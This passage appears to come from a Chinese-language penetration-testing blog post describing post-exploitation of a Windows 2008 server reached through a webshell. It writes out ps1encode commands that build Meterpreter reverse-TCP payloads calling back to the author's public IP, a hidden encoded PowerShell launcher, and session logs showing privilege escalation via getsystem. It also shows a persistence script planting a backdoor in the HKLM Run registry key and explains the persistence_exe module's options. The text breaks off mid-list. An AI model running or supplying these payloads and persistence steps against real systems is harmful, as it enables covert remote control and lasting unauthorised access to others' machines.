</span></span><span style=display:flex><span>隧道适配器 isatap.{228D34A2-****-B05B-2891059A32DF}:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   媒体状态  . . . . . . . . . . . . : 媒体已断开
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>隧道适配器 isatap.{9F839E1D-****-82F7-592092A89872}:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   媒体状态  . . . . . . . . . . . . : 媒体已断开
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>隧道适配器 isatap.{C900083B-5E7E-****-8BC25B24D7C1}:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   媒体状态  . . . . . . . . . . . . : 媒体已断开
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>隧道适配器 isatap.{0E2DB1B0-50C3-****-4F5513DCBD08}:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   媒体状态  . . . . . . . . . . . . : 媒体已断开
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>隧道适配器 6TO4 Adapter:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>   IPv6 地址 . . . . . . . . . . . . : ***
</span></span><span style=display:flex><span>   默认网关. . . . . . . . . . . . . : 
</span></span><span style=display:flex><span> 
</span></span></code></pre></td></tr></table></div></div><p>这个内网地址我就不脱敏了，方便读者阅读后面的操作</p><h2 id=0x02-后渗透的开始>0x02 后渗透的开始</h2><p><img src=https://images.payloads.online/ef156158-4f5e-11ec-9ba8-00d861bf4abb.png alt=0x01></p><p>网络拓扑图如上</p><p>首先我要生成一个MSF木马，目标由于是Win 2008支持<code>Powershell</code>，可以直接一句话搞定 :)</p><p><code>./ps1encode.rb -i 外网IP -p 1131 -a windows/x64/meterpreter/reverse_tcp</code></p><p>这里我是进行了一个端口转发，将公司路由的1131映射到本机的1131</p><p>MSF这边监听1131：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>Jobs
</span></span><span style=display:flex><span><span style=color:#f92672>====</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name                    Payload                          Payload opts
</span></span><span style=display:flex><span>  <span style=color:#f92672>--</span>  <span style=color:#f92672>----</span>                    <span style=color:#f92672>-------</span>                          <span style=color:#f92672>------------</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0</span>   Exploit: multi<span style=color:#f92672>/</span>handler  windows<span style=color:#f92672>/</span>meterpreter<span style=color:#f92672>/</span>reverse_tcp  tcp:<span style=color:#f92672>//</span><span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#ae81ff>1131</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>ps1encode 项目 ：https://github.com/CroweCybersecurity/ps1encode</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>powershell -nop -win Hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ
</span></span><span style=display:flex><span>..........
</span></span></code></pre></td></tr></table></div></div><p>但是期望越大失望越大，目标主机提示语法错误，难道是webshell传输字符串太长有丢失？</p><p>我尝试了使用cmd批处理脚本启动，vbs脚本启动，一样无果。</p><p>决定不采用powershell了，采用exe</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./ps1encode.rb -i [我的公网IP] -p 1131 -a windows/x64/meterpreter/reverse_tcp -t exe
</span></span></code></pre></td></tr></table></div></div><p>执行过程中有时候会出现这类情况：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf exploit(handler) &gt; 
</span></span><span style=display:flex><span>[*] Sending stage (179267 bytes) to *.*.*.*
</span></span><span style=display:flex><span>[*] Meterpreter session 1 opened (192.168.3.13:1131 -&gt; *.*.*.*:54103) at 2017-12-27 13:54:58 +0800
</span></span><span style=display:flex><span>[*] *.*.*.* - Meterpreter session 9 closed.  Reason: Died
</span></span></code></pre></td></tr></table></div></div><p>很明显是生成的木马与操作系统不兼容；</p><p>更改为：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./ps1encode.rb -i *.*.*.* -p 1131 -a windows/x64/meterpreter/reverse_tcp --32bitexe -t exe
</span></span></code></pre></td></tr></table></div></div><p>使用WebShell执行后：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf exploit(handler) &gt; 
</span></span><span style=display:flex><span>[*] Sending stage (179267 bytes) to *.*.*.*
</span></span><span style=display:flex><span>[*] Meterpreter session 6 opened (192.168.3.13:1131 -&gt; *.*.*.*:54085) at 2017-12-27 13:51:41 +0800
</span></span></code></pre></td></tr></table></div></div><h3 id=权限维持>权限维持</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>msf exploit(handler) <span style=color:#f92672>&gt;</span> sessions <span style=color:#f92672>-</span>i <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Starting interaction with <span style=color:#ae81ff>6.</span><span style=color:#f92672>..</span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> getsystem
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>got system via technique <span style=color:#ae81ff>1</span> (Named Pipe Impersonation (In Memory<span style=color:#f92672>/</span>Admin))<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> run persistence <span style=color:#f92672>-</span>X <span style=color:#f92672>-</span>i <span style=color:#ae81ff>50</span> <span style=color:#f92672>-</span>p <span style=color:#ae81ff>1132</span> <span style=color:#f92672>-</span>r [<span style=color:#960050;background-color:#1e0010>我的公网</span><span style=color:#a6e22e>IP</span>] 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>!</span>] Meterpreter scripts are deprecated<span style=color:#f92672>.</span> Try post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>!</span>] Example: run post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe OPTION<span style=color:#f92672>=</span>value [<span style=color:#f92672>...</span>]
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Running Persistence <span style=color:#a6e22e>Script</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] <span style=color:#a6e22e>Resource</span> file <span style=color:#66d9ef>for</span> cleanup created at <span style=color:#f92672>/</span>Users<span style=color:#f92672>/</span>liyingzhe<span style=color:#f92672>/.</span>msf4<span style=color:#f92672>/</span>logs<span style=color:#f92672>/</span>persistence<span style=color:#f92672>/</span>ZXKF3_20171227<span style=color:#f92672>.</span><span style=color:#ae81ff>1214</span><span style=color:#f92672>/</span>ZXKF3_20171227<span style=color:#f92672>.</span><span style=color:#ae81ff>1214.</span>rc
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Creating Payload<span style=color:#f92672>=</span>windows<span style=color:#f92672>/</span>meterpreter<span style=color:#f92672>/</span>reverse_tcp LHOST<span style=color:#f92672>=*.*.*.*</span> LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>1132</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Persistent agent script is <span style=color:#ae81ff>99700</span> bytes long
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Persistent <span style=color:#a6e22e>Script</span> written to C:\Users\ALLEN<span style=color:#f92672>~</span><span style=color:#ae81ff>1.</span>ZXK\AppData\Local\Temp\iyWfiOpMC<span style=color:#f92672>.</span>vbs
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Executing script C:\Users\ALLEN<span style=color:#f92672>~</span><span style=color:#ae81ff>1.</span>ZXK\AppData\Local\Temp\iyWfiOpMC<span style=color:#f92672>.</span>vbs
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Agent executed with PID <span style=color:#ae81ff>5204</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CRHiMoLoChdTP
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CRHiMoLoChdTP
</span></span></code></pre></td></tr></table></div></div><h2 id=0x03-关于权限维持的思考>0x03 关于权限维持的思考</h2><blockquote><p>persistence 模块</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> info post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       Name: Windows Manage Persistent EXE Payload Installer
</span></span><span style=display:flex><span>     Module: post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe
</span></span><span style=display:flex><span>   Platform: Windows
</span></span><span style=display:flex><span>       Arch: 
</span></span><span style=display:flex><span>       Rank: Normal
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Provided by:
</span></span><span style=display:flex><span>  Merlyn drforbin Cousins <span style=color:#f92672>&lt;</span>drforbin6<span style=color:#960050;background-color:#1e0010>@</span>gmail<span style=color:#f92672>.</span>com<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Basic options:
</span></span><span style=display:flex><span>  Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>  <span style=color:#f92672>----</span>      <span style=color:#f92672>---------------</span>  <span style=color:#f92672>--------</span>  <span style=color:#f92672>-----------</span>
</span></span><span style=display:flex><span>  REXENAME  default<span style=color:#f92672>.</span>exe      yes       The name to call exe on remote system
</span></span><span style=display:flex><span>  REXEPATH                   yes       The remote executable to use<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  SESSION                    yes       The session to run this module on<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  STARTUP   USER             yes       Startup type <span style=color:#66d9ef>for</span> the persistent payload<span style=color:#f92672>.</span> (Accepted: USER, SYSTEM, SERVICE)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Description:
</span></span><span style=display:flex><span>  This Module will upload an executable to a remote host <span style=color:#f92672>and</span> make it 
</span></span><span style=display:flex><span>  Persistent<span style=color:#f92672>.</span> It can be installed as USER, SYSTEM, <span style=color:#f92672>or</span> SERVICE<span style=color:#f92672>.</span> USER 
</span></span><span style=display:flex><span>  will start on user login, SYSTEM will start on system boot but 
</span></span><span style=display:flex><span>  requires privs<span style=color:#f92672>.</span> SERVICE will create a new service which will start 
</span></span><span style=display:flex><span>  the payload<span style=color:#f92672>.</span> Again requires privs<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options (post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   <span style=color:#f92672>----</span>      <span style=color:#f92672>---------------</span>  <span style=color:#f92672>--------</span>  <span style=color:#f92672>-----------</span>
</span></span><span style=display:flex><span>   REXENAME  default<span style=color:#f92672>.</span>exe      yes       The name to call exe on remote system
</span></span><span style=display:flex><span>   REXEPATH                   yes       The remote executable to use<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>   SESSION                    yes       The session to run this module on<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>   STARTUP   USER             yes       Startup type <span style=color:#66d9ef>for</span> the persistent payload<span style=color:#f92672>.</span> (Accepted: USER, SYSTEM, SERVICE)
</span></span></code></pre></td></tr></table></div></div><p>优先介绍这个模块 <code>post/windows/manage/persistence_exe</code></p><p>它用于创建一个反向连接的后门，使被控端主动连接控制端，传统又好用，但是会留下文件</p><p>参数介绍：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>[<span style=color:#f92672>!</span>] Meterpreter scripts are deprecated<span style=color:#f92672>.</span> Try post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>!</span>] Example: run post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>persistence_exe OPTION<span style=color:#f92672>=</span>value [<span style=color:#f92672>...</span>]
</span></span><span style=display:flex><span>Meterpreter <span style=color:#a6e22e>Script</span> <span style=color:#66d9ef>for</span> creating a persistent backdoor on a target host<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OPTIONS:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>A        <span style=color:#960050;background-color:#1e0010>自启动一个匹配的</span>handler会话来连接
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>L <span style=color:#f92672>&lt;</span>opt<span style=color:#f92672>&gt;</span>  <span style=color:#960050;background-color:#1e0010>连接目标</span>
